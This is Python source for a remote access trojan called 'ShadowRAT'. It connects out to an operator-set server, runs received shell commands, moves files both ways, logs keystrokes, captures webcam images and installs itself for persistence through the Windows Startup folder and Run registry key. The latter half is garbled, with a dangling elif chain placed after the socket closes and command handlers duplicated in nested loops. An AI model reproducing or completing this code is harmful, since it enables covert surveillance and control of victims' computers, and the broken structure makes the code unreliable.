import socket
import subprocess
import os
import threading
import time
import sys

# Keylogger setup
keylog_data = []
keylog_running = False
def keylogger():
    global keylog_running
    try:
        import pynput.keyboard
    except ImportError:
        return
    def on_press(key):
        try:
            keylog_data.append(str(key.char))
        except AttributeError:
            keylog_data.append(str(key))
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    while keylog_running:
        time.sleep(1)
    listener.stop()

# Webcam setup
def webcam_snap():
    try:
        import cv2
    except ImportError:
        return b'cv2 not installed'
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cam.release()
    if ret:
        import tempfile
        import base64
        temp = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
        cv2.imwrite(temp.name, frame)
        with open(temp.name, 'rb') as f:
            img = f.read()
        os.unlink(temp.name)
        return img
    return b'Failed to capture'

# Persistence setup
def add_persistence():
    try:
        import shutil
        import winreg
        exe_path = sys.executable
        dest = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shadowrat.exe')
        shutil.copy(exe_path, dest)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ShadowRAT", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
        return b'Persistence added'
    except Exception as e:
        return str(e).encode()

SERVER_HOST = '127.0.0.1'  # Change to server IP
SERVER_PORT = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    cmd = s.recv(4096).decode()
    if cmd.lower() == 'exit':
        break
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        output = str(e).encode()
    s.send(output)
s.close()
        elif cmd.startswith('download '):
            filename = cmd.split(' ', 1)[1]
            try:
                with open(filename, 'rb') as f:
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        s.send(chunk)
                s.send(b'__END__')
            except Exception as e:
                s.send(str(e).encode())
                s.send(b'__END__')
        elif cmd.startswith('upload '):
            filename = cmd.split(' ', 1)[1]
            with open(filename, 'wb') as f:
                while True:
                    cmd = s.recv(4096).decode()
                    if cmd.lower() == 'exit':
                        break
                    elif cmd.startswith('download '):
                        filename = cmd.split(' ', 1)[1]
                        try:
                            with open(filename, 'rb') as f:
                                while True:
                                    chunk = f.read(4096)
                                    if not chunk:
                                        break
                                    s.send(chunk)
                            s.send(b'__END__')
                        except Exception as e:
                            s.send(str(e).encode())
                            s.send(b'__END__')
                    elif cmd.startswith('upload '):
                        filename = cmd.split(' ', 1)[1]
                        with open(filename, 'wb') as f:
                            while True:
                                data = s.recv(4096)
                                if data == b'__END__':
                                    break
                                f.write(data)
                    elif cmd.startswith('list '):
                        path = cmd.split(' ', 1)[1]
                        try:
                            files = os.listdir(path)
                            output = '\n'.join(files).encode()
                        except Exception as e:
                            output = str(e).encode()
                        s.send(output)
                    elif cmd == 'keylog_start':
                        if not keylog_running:
                            keylog_running = True
                            threading.Thread(target=keylogger, daemon=True).start()
                            s.send(b'Keylogger started')
                        else:
                            s.send(b'Keylogger already running')
                    elif cmd == 'keylog_stop':
                        keylog_running = False
                        s.send(b'Keylogger stopped')
                    elif cmd == 'keylog_dump':
                        s.send(''.join(keylog_data).encode())
                        keylog_data.clear()
                    elif cmd == 'webcam_snap':
                        img = webcam_snap()
                        s.send(img)
                    elif cmd == 'persist':
                        result = add_persistence()
                        s.send(result)
                    else:
                        try:
                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                        except Exception as e:
                            output = str(e).encode()
                        s.send(output)
                s.close()
